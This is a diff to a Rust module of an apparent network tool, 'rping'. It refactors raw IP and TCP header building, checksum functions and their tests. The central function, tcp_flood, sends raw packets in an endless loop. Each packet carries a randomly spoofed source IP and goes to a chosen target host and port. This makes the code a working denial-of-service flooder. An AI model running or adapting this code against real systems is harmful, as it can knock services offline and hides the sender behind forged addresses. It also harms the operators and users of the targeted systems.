@@ -5,8 +5,6 @@ use rand::Rng;
 use socket2::{Domain, Protocol, SockAddr, Socket, Type};
 use std::io;
 use std::net::{Ipv4Addr, SocketAddrV4};
-use std::str::FromStr;
-use std::time::SystemTime;
 
 /// Calculates the TCP checksum.
 ///
@@ -22,18 +20,21 @@ use std::time::SystemTime;
 /// # Examples
 ///
 /// ```
-/// use rping::utils::{calculate_tcp_checksum};
-/// use rping::ip::{IpHeader};
-/// use rping::tcp::{TcpHeader};
-///
+/// use rping::utils::calculate_tcp_checksum;
+/// use rping::ip::IpHeader;
+/// use rping::tcp::TcpHeader;
 ///
 /// let ip_header = IpHeader {
 ///     version_ihl: 0x45,
+///     tos: 0,
+///     len: 20,
+///     id: 0,
+///     offset: 0,
 ///     ttl: 64,
-///     source_ip: 0xC0A80001, // 192.168.0.1
-///     dest_ip: 0xC0A80002,   // 192.168.0.2
 ///     protocol: 6,
-///     len: 0,
+///     sum: 0,
+///     src: 0xC0A80001, // 192.168.0.1
+///     dst: 0xC0A80002, // 192.168.0.2
 /// };
 ///
 /// let tcp_header = TcpHeader {
@@ -41,22 +42,23 @@ use std::time::SystemTime;
 ///     dport: 80,
 ///     seq: 12345,
 ///     ack: 0,
-///     offx2: 0x50,
-///     flags: 0x02,
+///     off_reserved_flags: 0x5010,
 ///     win: 1024,
 ///     sum: 0,
 ///     urp: 0,
+///     opt: 0,
+///     pad: 0,
 /// };
 ///
 /// let checksum = calculate_tcp_checksum(&ip_header, &tcp_header);
-/// assert_eq!(checksum, 50155);
+/// assert_eq!(checksum, 33849);
 /// ```
 pub fn calculate_tcp_checksum(ip_header: &IpHeader, tcp_header: &TcpHeader) -> u16 {
     let pseudo_header = [
-        ((u32::from_be(ip_header.source_ip) >> 16) & 0xFFFF) as u16,
-        (u32::from_be(ip_header.source_ip) & 0xFFFF) as u16,
-        ((u32::from_be(ip_header.dest_ip) >> 16) & 0xFFFF) as u16,
-        (u32::from_be(ip_header.dest_ip) & 0xFFFF) as u16,
+        ((u32::from_be(ip_header.src) >> 16) & 0xFFFF) as u16,
+        (u32::from_be(ip_header.src) & 0xFFFF) as u16,
+        ((u32::from_be(ip_header.dst) >> 16) & 0xFFFF) as u16,
+        (u32::from_be(ip_header.dst) & 0xFFFF) as u16,
         u16::from_be(ip_header.protocol.into()),
         std::mem::size_of::<TcpHeader>() as u16,
     ];
@@ -97,7 +99,6 @@ pub fn calculate_tcp_checksum(ip_header: &IpHeader, tcp_header: &TcpHeader) -> u
 ///
 /// # Arguments
 /// * `ip_header` - A slice representing the IP header.
-/// * `source_ip` - The source IP address to be set in the packet.
 /// * `dest_ip` - The destination IP address as a string.
 /// * `dest_port` - The destination port number.
 /// * `packet_len` - The syn packet length.
@@ -112,14 +113,12 @@ pub fn calculate_tcp_checksum(ip_header: &IpHeader, tcp_header: &TcpHeader) -> u
 ///
 /// // Example usage of the send_raw_ip_packet function
 /// let ip_header: &[u8] = &[];
-/// let source_ip = 0xC0A80001u32 as i32; // Example source IP
 /// let dest_ip = "192.168.0.2";
 /// let dest_port = 8080;
-/// // send_raw_ip_packet(ip_header, source_ip, dest_ip, dest_port, 1500);
+/// // send_raw_ip_packet(ip_header, dest_ip, dest_port, 1500);
 /// ```
 pub fn send_raw_ip_packet(
     ip_header: &[u8],
-    source_ip: u32,
     dest_ip: &str,
     dest_port: u16,
     packet_len: usize,
@@ -128,21 +127,13 @@ pub fn send_raw_ip_packet(
 
     let dest_addr = SocketAddrV4::new(dest_ip.parse().unwrap(), dest_port);
 
+    let _ = socket.set_header_included(true);
+
     // Connect the socket
     socket.connect(&SockAddr::from(dest_addr)).unwrap();
-
-    let bytes = {
-        let ip_header_bytes: &[u8] = ip_header;
-        ip_header_bytes
-    };
-
     // Ensure buffer has enough space
     let mut buffer = vec![0u8; packet_len];
-    buffer[..bytes.len()].copy_from_slice(bytes);
-
-    // Set the source IP address directly in the buffer
-    buffer[12..16].copy_from_slice(&source_ip.to_be_bytes());
-
+    buffer[..ip_header.len()].copy_from_slice(ip_header);
     // Use `send` to send data on a connected TCP socket
     socket.send(&buffer)?;
 
@@ -168,94 +159,43 @@ pub fn generate_random_ip() -> u32 {
     let random_ip: u32 = rand::thread_rng().gen_range(min_ip..=max_ip);
     random_ip
 }
-/// Fills in a TCP header with random values.
-///
-/// # Arguments
-///
-/// * `dest_port` - The target port.
-///
-/// # Returns
-///
-/// (`TcpHeader`): The TCP header with random values.
-///
-/// # Examples
-///
-/// ```
-/// use rping::utils::fill_tcp_header;
-///
-/// let tcp_header = fill_tcp_header(80);
-/// // Ensure that relevant fields have been initialized properly.
-/// assert_ne!(tcp_header.sport, 0);
-/// assert_ne!(tcp_header.seq, 0);
-/// ```
-pub fn fill_tcp_header(dest_port: u16) -> TcpHeader {
-    let mut rng = rand::thread_rng();
-    TcpHeader {
-        sport: (SystemTime::now()
-            .duration_since(SystemTime::UNIX_EPOCH)
-            .unwrap()
-            .as_millis()
-            % u16::MAX as u128) as u16,
-        dport: dest_port.to_be(),
-        seq: rng.gen::<u32>().to_be(),
-        ack: 0,
-        offx2: 80,
-        flags: 2,
-        win: rng.gen::<u16>().to_be(),
-        sum: 0,
-        urp: 0,
-    }
-}
 
-/// Fills in an IP header with the given source IP and computes the length and checksum.
+/// Calculates the IP header checksum based on the provided `IpHeader`.
+///
+/// # Safety
+///
+/// This function relies on unsafe pointer operations to treat the `IpHeader`
+/// as a slice of u16. Ensure that the size of `IpHeader` is a multiple of 2 bytes.
+/// The function performs the checksum calculation based on the 16-bit words in the header.
 ///
 /// # Arguments
 ///
-/// * `source_ip` - The source IP address.
-/// * `dest_ip` - The target ip.
-/// * `dest_port` - The target port.
+/// * `ip_header` - A reference to the `IpHeader` struct for which the checksum is calculated.
 ///
 /// # Returns
 ///
-/// (`IpHeader`): The IP header with calculated length and checksum.
-///
-/// # Examples
-///
-/// ```
-/// use rping::utils::{fill_ip_header, generate_random_ip, calculate_tcp_checksum};
-///
-/// let source_ip = generate_random_ip();
-/// let ip_header = fill_ip_header(source_ip, "192.168.1.10", 80);
-/// // Ensure that relevant fields have been initialized properly.
-/// assert_eq!(ip_header.version_ihl, (4 << 4) | 5);
-/// assert_eq!(ip_header.protocol, 6);
-/// ```
-pub fn fill_ip_header(source_ip: u32, dest_ip: &str, dest_port: u16) -> IpHeader {
-    let mut ip_header = IpHeader {
-        version_ihl: (4 << 4) | 5,
-        ttl: 50,
-        source_ip,
-        dest_ip: Ipv4Addr::from_str(dest_ip).unwrap().into(),
-        protocol: 6,
-        len: 0,
+/// Returns the calculated IP header checksum as a u16.
+pub fn calculate_ip_checksum(ip_header: &IpHeader) -> u16 {
+    // SAFETY: We know that the size of IpHeader is a multiple of 2 bytes.
+    // This allows us to safely cast the IpHeader to a slice of u16.
+    let words = unsafe {
+        std::slice::from_raw_parts(
+            ip_header as *const _ as *const u16,
+            std::mem::size_of::<IpHeader>() / 2,
+        )
     };
 
-    ip_header.len = ip_header
-        .len
-        .wrapping_add(std::mem::size_of::<IpHeader>() as u16);
-    ip_header.len = ip_header
-        .len
-        .wrapping_add(std::mem::size_of::<TcpHeader>() as u16);
-    ip_header.len = ip_header
-        .len
-        .wrapping_add(calculate_tcp_checksum(
-            &ip_header,
-            &fill_tcp_header(dest_port),
-        ))
-        .to_be();
+    // Calculate the sum of 16-bit words as u32
+    let sum: u32 = words.iter().map(|&word| u32::from(word)).sum();
 
-    ip_header
+    // Calculate carry and fold the sum to 16 bits
+    let carry = sum >> 16;
+    let folded_sum = (sum & 0xFFFF) + carry;
+
+    // Calculate and return the one's complement checksum
+    !folded_sum as u16
 }
+
 /// Creates a combined header by concatenating the bytes of IP and TCP headers.
 ///
 /// # Arguments
@@ -270,16 +210,15 @@ pub fn fill_ip_header(source_ip: u32, dest_ip: &str, dest_port: u16) -> IpHeader
 /// # Examples
 ///
 /// ```
-/// use rping::utils::{fill_ip_header, fill_tcp_header, create_combined_header, generate_random_ip};
+/// use rping::utils::{create_combined_header, generate_random_ip};
 /// use rping::tcp::TcpHeader;
 /// use rping::ip::IpHeader;
 ///
 /// let source_ip = generate_random_ip();
-/// let ip_header = fill_ip_header(source_ip, "192.168.0.1", 80);
-/// let tcp_header = fill_tcp_header(80);
+/// let ip_header = IpHeader::new(source_ip, "192.168.0.1");
+/// let tcp_header = TcpHeader::new(80);
 ///
 /// let combined_header = create_combined_header(&ip_header, &tcp_header);
-/// // Ensure that the combined header has the expected length.
 /// assert_eq!(combined_header.len(), std::mem::size_of::<IpHeader>() + std::mem::size_of::<TcpHeader>());
 /// ```
 pub fn create_combined_header(ip_header: &IpHeader, tcp_header: &TcpHeader) -> Vec<u8> {
@@ -321,7 +260,6 @@ pub fn create_combined_header(ip_header: &IpHeader, tcp_header: &TcpHeader) -> V
 /// // tcp_flood(1500, "192.168.1.10", 80);
 /// ```
 pub fn tcp_flood(packet_len: usize, dest_ip: &str, dest_port: u16) {
-    let mut buffer = vec![0u8; packet_len];
     let progress_bar = ProgressBar::new_spinner();
     progress_bar.set_style(
         ProgressStyle::default_spinner()
@@ -333,13 +271,12 @@ pub fn tcp_flood(packet_len: usize, dest_ip: &str, dest_port: u16) {
 
     loop {
         let source_ip = generate_random_ip();
-        let ip_header = fill_ip_header(source_ip, dest_ip, dest_port);
-        let tcp_header = fill_tcp_header(dest_port);
+        let ip_header = IpHeader::new(source_ip, dest_ip);
+        let tcp_header = TcpHeader::new(dest_port);
 
+        // ip_header.len = (packet_len - std::mem::size_of::<IpHeader>() as usize) as u16;
         let combined_header_slice = create_combined_header(&ip_header, &tcp_header);
-        buffer[..combined_header_slice.len()].copy_from_slice(&combined_header_slice);
-
-        let _ = send_raw_ip_packet(&buffer, source_ip, dest_ip, dest_port, packet_len);
+        let _ = send_raw_ip_packet(&combined_header_slice, dest_ip, dest_port, packet_len);
         progress_bar.inc(1);
     }
 }
@@ -347,16 +284,19 @@ pub fn tcp_flood(packet_len: usize, dest_ip: &str, dest_port: u16) {
 #[cfg(test)]
 mod tests {
     use super::*;
-
     #[test]
     fn test_calculate_tcp_checksum() {
         let ip_header = IpHeader {
             version_ihl: 0x45,
+            tos: 0,
+            len: 20,
+            id: 0,
+            offset: 0,
             ttl: 64,
-            source_ip: 0xC0A80001, // 192.168.0.1
-            dest_ip: 0xC0A80002,   // 192.168.0.2
             protocol: 6,
-            len: 0,
+            sum: 0,
+            src: 0xC0A80001, // 192.168.0.1
+            dst: 0xC0A80002, // 192.168.0.2
         };
 
         let tcp_header = TcpHeader {
@@ -364,46 +304,59 @@ mod tests {
             dport: 80,
             seq: 12345,
             ack: 0,
-            offx2: 0x50,
-            flags: 0x02,
+            off_reserved_flags: 0x5010,
             win: 1024,
             sum: 0,
             urp: 0,
+            opt: 0,
+            pad: 0,
         };
 
         let checksum = calculate_tcp_checksum(&ip_header, &tcp_header);
 
-        assert_eq!(checksum, 50155);
-    }
-
-    #[test]
-    fn test_fill_tcp_header() {
-        let tcp_header = fill_tcp_header(80);
-        // Ensure that relevant fields have been initialized properly.
-        assert_ne!(tcp_header.sport, 0);
-        assert_ne!(tcp_header.seq, 0);
+        assert_eq!(checksum, 33849);
     }
 
     #[test]
     fn test_fill_ip_header() {
         let source_ip = generate_random_ip();
-        let ip_header = fill_ip_header(source_ip, "192.168.1.10", 80);
-        // Ensure that relevant fields have been initialized properly.
-        assert_eq!(ip_header.version_ihl, (4 << 4) | 5);
+        let ip_header = IpHeader::new(source_ip, "192.168.1.10");
+        assert_eq!(ip_header.version_ihl, 0x45); // Assuming IHL is 5 words
         assert_eq!(ip_header.protocol, 6);
     }
 
     #[test]
     fn test_create_combined_header() {
         let source_ip = generate_random_ip();
-        let ip_header = fill_ip_header(source_ip, "192.168.1.10", 80);
-        let tcp_header = fill_tcp_header(80);
+        let ip_header = IpHeader::new(source_ip, "192.168.1.10");
+        let tcp_header = TcpHeader::new(80);
 
         let combined_header = create_combined_header(&ip_header, &tcp_header);
-        // Ensure that the combined header has the expected length.
         assert_eq!(
             combined_header.len(),
             std::mem::size_of::<IpHeader>() + std::mem::size_of::<TcpHeader>()
         );
+    }
+
+    #[test]
+    fn test_calculate_ip_checksum() {
+        let ip_header = IpHeader {
+            version_ihl: 0x45,
+            tos: 0,
+            len: 20,
+            id: 0,
+            offset: 0,
+            ttl: 50,
+            protocol: 6,
+            sum: 0,
+            src: 0xC0A80101, // 192.168.1.1
+            dst: 0xC0A80102, // 192.168.1.2
+        };
+
+        let checksum = calculate_ip_checksum(&ip_header);
+
+        let expected_checksum = 30240;
+
+        assert_eq!(checksum, expected_checksum);
     }
 }
